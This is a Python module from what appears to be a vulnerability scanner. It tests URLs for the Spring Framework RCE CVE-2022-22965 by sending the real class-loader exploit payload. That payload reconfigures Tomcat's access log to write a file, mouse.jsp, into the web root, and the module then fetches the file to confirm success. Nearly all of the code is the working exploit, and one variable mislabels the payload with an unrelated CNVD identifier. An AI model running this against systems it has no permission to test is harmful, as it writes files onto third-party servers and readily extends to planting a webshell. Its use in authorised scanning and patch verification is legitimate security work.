#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    Spring扫描类: 
        Spring Framework RCE(Spring core RCE)
            CVE-2022-22965
'''

from lib.initial.config import config
from lib.tool.md5 import md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests
from time import sleep

class Spring():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Spring'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cnvd_2018_24942_payloads = [
            {
                'path': '',
                'data': 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20out.println(%22<h1>{}</h1>%22)%3B%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=mouse&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='.format('CVE/2022/22965')
            }
        ]

    def cve_2022_22965_scan(self, url):
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2022-22965'
        vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {
            'suffix': '%>//',
            'c1': 'Runtime',
            'c2': '<%',
            'DNT': '1'
        }

        headers = self.headers
        headers.update(vul_info['headers'])

        for payload in self.cnvd_2018_24942_payloads:   # * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                vul_info['status_code'] = str(res.status_code)
                logger.logging(vul_info)                        # * LOG
            except requests.ConnectTimeout:
                vul_info['status_code'] = 'Timeout'
                logger.logging(vul_info)
                return None
            except requests.ConnectionError:
                vul_info['status_code'] = 'Faild'
                logger.logging(vul_info)
                return None

            for i in range(5):
                sleep(3)                                # * 延时, 因为命令执行可能有延迟, 要等一会判断结果才准确
                verify_url = url + 'mouse.jsp'
                verify_res = requests.get(
                        verify_url, 
                        timeout=self.timeout, 
                        proxies=self.proxies, 
                        verify=False,
                        allow_redirects=False
                    )

                if ((verify_res.status_code == 200) and (check.check_res(verify_res.text, '22965'))):
                    results = {
                        'Target': target,
                        'Verify': verify_url,
                        'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                        'Method': vul_info['vul_method'],
                        'Payload': {
                            'url': url,
                            'Data': data,
                            'Headers': str(vul_info['headers'])
                        }
                    }
                    return results

    def addscan(self, url):
        return [
            thread(target=self.cve_2022_22965_scan, url=url)
        ]

spring = Spring()